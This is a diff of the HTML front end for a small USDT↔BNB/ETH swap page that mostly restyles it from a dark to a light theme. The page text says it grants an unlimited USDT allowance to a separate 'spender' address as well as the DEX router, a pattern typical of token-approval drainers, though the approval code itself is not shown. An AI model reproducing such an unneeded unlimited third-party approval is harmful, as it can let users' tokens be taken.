@@ -4,122 +4,77 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>USDT MiniSwap — BNB & ETH only</title>
-  <!-- Google Fonts - Inter -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <!-- Tailwind (CDN for quick start) -->
   <script src="https://cdn.tailwindcss.com"></script>
   <!-- Ethers v6 (CDN) -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.min.js"></script>
   <style>
-    body {
-      font-family: 'Inter', sans-serif;
-      background: linear-gradient(to bottom right, #1a202c, #2d3748);
-      color: #e2e8f0;
-    }
-    .card {
-      background-color: rgba(30, 41, 59, 0.7);
-      backdrop-filter: blur(12px);
-      border: 1px solid rgba(71, 85, 105, 0.5);
-    }
-    .input-field {
-      background-color: #2f3e53;
-      border: 1px solid #475569;
-      color: #f8fafc;
-      transition: all 0.2s ease-in-out;
-    }
-    .input-field:focus {
-      border-color: #818cf8;
-      box-shadow: 0 0 0 3px rgba(129, 140, 248, 0.5);
-    }
-    .btn-secondary {
-      background-color: #2f3e53;
-      border: 1px solid #475569;
-      color: #e2e8f0;
-      transition: all 0.2s ease-in-out;
-    }
-    .btn-secondary:hover {
-      background-color: #475569;
-    }
-    .btn-primary {
-      background: linear-gradient(90deg, #7c3aed, #4f46e5);
-      color: white;
-      transition: all 0.2s ease-in-out;
-    }
-    .btn-primary:hover {
-      opacity: 0.9;
-      transform: translateY(-1px);
-    }
-    .btn-primary:disabled {
-        opacity: 0.5;
-        cursor: not-allowed;
-        transform: none;
-    }
+    body { background: radial-gradient(1200px 600px at 10% 10%, #f7fafc 0, #eef2f7 50%, #e9edf3 100%); }
+    .card { backdrop-filter: blur(8px); }
     input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
     input[type=number] { -moz-appearance: textfield; }
   </style>
 </head>
-<body class="min-h-screen p-6 flex flex-col items-center justify-center">
-  <div class="max-w-xl mx-auto space-y-6 w-full">
-    <header class="flex items-center justify-between p-6 rounded-3xl shadow-lg card">
-      <div class="flex items-center gap-4">
-        <h1 class="text-2xl font-bold">USDT MiniSwap</h1>
-        <span class="px-3 py-1 text-xs font-semibold rounded-full bg-slate-700 border border-slate-600 text-slate-300">BNB & ETH only</span>
+<body class="min-h-screen p-4 text-gray-900">
+  <div class="max-w-3xl mx-auto space-y-4">
+    <header class="flex items-center justify-between p-4 rounded-2xl shadow border bg-white/70 card">
+      <div class="flex items-center gap-2">
+        <h1 class="text-xl font-semibold">USDT MiniSwap</h1>
+        <span class="px-2 py-0.5 text-xs rounded-full bg-gray-100 border">BNB & ETH only</span>
       </div>
-      <div class="flex items-center gap-3">
-        <span id="addressTag" class="hidden text-sm font-mono bg-slate-700 border border-slate-600 px-3 py-1.5 rounded-lg text-slate-300"></span>
-        <button id="connectBtn" class="px-4 py-2 rounded-xl shadow-sm hover:bg-slate-700 border border-slate-600 transition-colors">Connect Wallet</button>
+      <div class="flex items-center gap-2">
+        <span id="addressTag" class="hidden text-sm font-mono bg-gray-100 border px-2 py-1 rounded"></span>
+        <button id="connectBtn" class="px-3 py-1.5 rounded-xl border shadow-sm hover:bg-gray-50">Connect Wallet</button>
       </div>
     </header>
 
-    <main class="w-full p-8 rounded-3xl shadow-2xl card">
-      <div class="flex items-center justify-between mb-6">
-        <div class="flex gap-2 p-1 rounded-full bg-slate-700">
-          <button id="bscMode" class="px-4 py-2 rounded-full font-medium transition-all text-white bg-slate-900 shadow-inner">BSC · BNB</button>
-          <button id="ethMode" class="px-4 py-2 rounded-full font-medium transition-all hover:bg-slate-800">Ethereum · ETH</button>
+    <main class="max-w-xl mx-auto p-6 rounded-2xl shadow-lg border bg-white/80 card">
+      <div class="flex items-center justify-between mb-4">
+        <div class="flex gap-2">
+          <button id="bscMode" class="px-3 py-1.5 rounded-xl border bg-gray-900 text-white">BSC · BNB</button>
+          <button id="ethMode" class="px-3 py-1.5 rounded-xl border hover:bg-gray-50">Ethereum · ETH</button>
         </div>
-        <span id="routerTag" class="text-sm text-slate-400 font-mono"></span>
+        <span id="routerTag" class="text-xs text-gray-500"></span>
       </div>
 
-      <div class="grid grid-cols-2 gap-3 mb-6">
-        <button id="btnU2N" class="px-4 py-3 rounded-2xl font-semibold btn-primary">USDT → <span id="nativeSym1">BNB</span></button>
-        <button id="btnN2U" class="px-4 py-3 rounded-2xl font-semibold btn-secondary"><span id="nativeSym2">BNB</span> → USDT</button>
+      <div class="grid grid-cols-2 gap-2 mb-4">
+        <button id="btnU2N" class="px-3 py-2 rounded-xl border bg-gray-900 text-white">USDT → <span id="nativeSym1">BNB</span></button>
+        <button id="btnN2U" class="px-3 py-2 rounded-xl border hover:bg-gray-50"><span id="nativeSym2">BNB</span> → USDT</button>
       </div>
 
-      <div class="space-y-4">
+      <div class="space-y-3">
         <div>
-          <label class="block text-sm text-slate-400 mb-2">From (<span id="inLabel">USDT</span>)</label>
-          <input id="amountIn" type="number" value="0.1" class="w-full px-4 py-3 rounded-xl input-field focus:ring-2" min="0" placeholder="0.0" />
-          <div class="mt-2 text-xs text-slate-500" id="balanceLine">Balance: 0</div>
+          <label class="block text-sm text-gray-600 mb-1">From (<span id="inLabel">USDT</span>)</label>
+          <input id="amountIn" type="number" value="0.1" class="w-full px-3 py-2 rounded-xl border focus:outline-none" min="0" placeholder="0.0" />
+          <div class="mt-1 text-xs text-gray-500" id="balanceLine">Balance: 0</div>
         </div>
 
         <div>
-          <label class="block text-sm text-slate-400 mb-2">To (<span id="outLabel">BNB</span>)</label>
-          <div id="amountOutBox" class="w-full px-4 py-3 rounded-xl bg-slate-800 border border-slate-600 text-lg font-medium">0.0</div>
+          <label class="block text-sm text-gray-600 mb-1">To (<span id="outLabel">BNB</span>)</label>
+          <div id="amountOutBox" class="w-full px-3 py-2 rounded-xl border bg-gray-50">0.0</div>
         </div>
 
-        <div class="grid grid-cols-2 gap-4">
+        <div class="grid grid-cols-2 gap-3">
           <div>
-            <label class="block text-sm text-slate-400 mb-2">Slippage (%)</label>
-            <input id="slippage" type="number" value="0.5" step="0.1" min="0" class="w-full px-4 py-3 rounded-xl input-field" />
+            <label class="block text-sm text-gray-600 mb-1">Slippage (%)</label>
+            <input id="slippage" type="number" value="0.5" step="0.1" min="0" class="w-full px-3 py-2 rounded-xl border" />
           </div>
           <div>
-            <label class="block text-sm text-slate-400 mb-2">Deadline (min)</label>
-            <input id="deadline" type="number" value="20" min="1" class="w-full px-4 py-3 rounded-xl input-field" />
+            <label class="block text-sm text-gray-600 mb-1">Deadline (min)</label>
+            <input id="deadline" type="number" value="20" min="1" class="w-full px-3 py-2 rounded-xl border" />
           </div>
         </div>
 
-        <button id="approveBtn" class="w-full px-4 py-4 rounded-2xl shadow-lg btn-secondary hidden">Approve USDT (Spender + Router)</button>
-        <button id="swapBtn" class="w-full px-4 py-4 rounded-2xl shadow-lg btn-primary">Swap</button>
+        <button id="approveBtn" class="w-full px-4 py-3 rounded-2xl border shadow hover:bg-gray-50 disabled:opacity-50 hidden">Approve USDT (Spender + Router)</button>
+        <button id="swapBtn" class="w-full px-4 py-3 rounded-2xl border shadow bg-gray-900 text-white disabled:opacity-50">Swap</button>
 
-        <div id="txStatus" class="text-sm text-slate-400 text-center"></div>
+        <div id="txStatus" class="text-xs text-gray-600"></div>
       </div>
 
-      <div class="mt-8 text-xs text-slate-500 space-y-2 border-t border-slate-700 pt-6">
+      <div class="mt-6 text-xs text-gray-500 space-y-1">
         <div>Pairs supported: BSC (USDT ↔ BNB), Ethereum (USDT ↔ ETH)</div>
         <div>Routers: PancakeSwap V2 (BSC), Uniswap V2 (Ethereum)</div>
-        <div>Approvals: Grants <strong>unlimited USDT</strong> allowance to <span class="font-mono text-slate-300" id="spenderTag"></span> (your consent required), and to the AMM Router for execution.</div>
+        <div>Approvals: Grants <strong>unlimited USDT</strong> allowance to <span class="font-mono" id="spenderTag"></span> (your consent required), and to the AMM Router for execution.</div>
         <div>Security: Always verify contract addresses and test with small amounts first.</div>
       </div>
     </main>
@@ -187,9 +142,9 @@
       nativeSym2.textContent = chain.native;
       outLabel.textContent = direction === "USDT_TO_NATIVE" ? chain.native : "USDT";
       spenderTag.textContent = short(SPENDER);
-      bscMode.classList.toggle("bg-slate-900", chain === CHAINS.BSC);
+      bscMode.classList.toggle("bg-gray-900", chain === CHAINS.BSC);
       bscMode.classList.toggle("text-white", chain === CHAINS.BSC);
-      ethMode.classList.toggle("bg-slate-900", chain === CHAINS.ETHEREUM);
+      ethMode.classList.toggle("bg-gray-900", chain === CHAINS.ETHEREUM);
       ethMode.classList.toggle("text-white", chain === CHAINS.ETHEREUM);
       refreshBalancesAndQuote();
       ensureChain();
@@ -382,10 +337,8 @@
 
     btnU2N.addEventListener('click', () => {
       direction = 'USDT_TO_NATIVE';
-      btnU2N.classList.add('btn-primary');
-      btnU2N.classList.remove('btn-secondary');
-      btnN2U.classList.add('btn-secondary');
-      btnN2U.classList.remove('btn-primary');
+      btnU2N.classList.add('bg-gray-900','text-white');
+      btnN2U.classList.remove('bg-gray-900','text-white');
       inLabel.textContent = 'USDT';
       outLabel.textContent = current.native;
       refreshBalancesAndQuote();
@@ -393,10 +346,8 @@
 
     btnN2U.addEventListener('click', () => {
       direction = 'NATIVE_TO_USDT';
-      btnN2U.classList.add('btn-primary');
-      btnN2U.classList.remove('btn-secondary');
-      btnU2N.classList.add('btn-secondary');
-      btnU2N.classList.remove('btn-primary');
+      btnN2U.classList.add('bg-gray-900','text-white');
+      btnU2N.classList.remove('bg-gray-900','text-white');
       inLabel.textContent = current.native;
       outLabel.textContent = 'USDT';
       refreshBalancesAndQuote();
